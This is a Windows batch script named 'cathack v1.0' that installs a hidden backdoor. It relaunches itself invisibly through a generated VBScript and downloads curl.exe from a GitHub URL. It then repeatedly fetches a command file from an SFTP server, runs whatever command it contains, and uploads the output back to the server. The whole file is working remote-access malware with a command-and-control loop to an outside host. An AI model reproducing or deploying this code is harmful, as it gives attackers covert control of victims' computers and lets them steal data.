@echo off
title cathack v1.0 :)
if exist h.vbs (
goto s
) else (
echo Set WshShell = CreateObject^("WScript.Shell"^) > h.vbs
          echo WshShell.Run chr(34^) ^& "batchbackdoor.bat" ^& Chr(34^), 0 >> h.vbs
             echo Set WshShell = Nothing >> h.vbs
    cscript //B h.vbs
    goto eof
)
:s
del h.vbs
rem msg * You have been hacked :)
if not exist curl.exe (
wget https://github.com/gato001k1/project-batch-message-app/raw/main/curl.exe
set "curlpath=%~dp0curl.exe"
goto c
) else (
    set "curlpath=%~dp0curl.exe"
goto c
)
:c
rem set up the ip addresses manually
set "server=1"
set "username=1"
set "password=1"
set "sftpmode=sftp"
:loop2
if NOT EXIST sftpchecker (
    mkdir sftpchecker
    goto sftpchecked
) else (
    goto sftpchecked
)
:sftpchecked
if exist com (
    for %%A in (com) do set local_file_size=%%~zA
) else (
    set local_file_size=0
)
cd sftpchecker
 "%curlpath%" --user %username%:%password% -o com %sftpmode%://%server%/com -k
if exist com (
    for %%A in (com) do set server_file_size=%%~zA
    cd ..
) else (
    set server_file_size=0
)
rem bug
goto f
:f
if %local_file_size% equ %server_file_size% (
    goto sftpchecked
) else (
   goto bug
)
:bug
    "%curlpath%" --user %username%:%password% -o com %sftpmode%://%server%/com -k
    set /p comman=<com
    if "%comman%"=="exitser" (
        goto eof
    ) else (
    %comman% >> hak
    timeout /T 1
"%curlpath%" -u %username%:%password% -T "hak" %sftpmode%://%server% -k
    goto sftpchecked
    )
:eof
exit